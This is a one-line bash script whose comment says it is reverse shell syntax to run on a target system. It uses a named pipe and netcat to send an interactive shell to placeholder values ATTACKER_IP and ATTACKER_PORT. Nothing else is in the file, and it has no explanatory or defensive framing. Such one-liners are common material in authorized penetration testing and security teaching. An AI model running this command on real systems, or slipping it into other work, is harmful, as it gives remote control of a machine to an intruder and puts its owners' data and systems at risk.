#! /bin/bash
# Simple pipe reverse shell syntax to be used on target system in order to establish connection

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
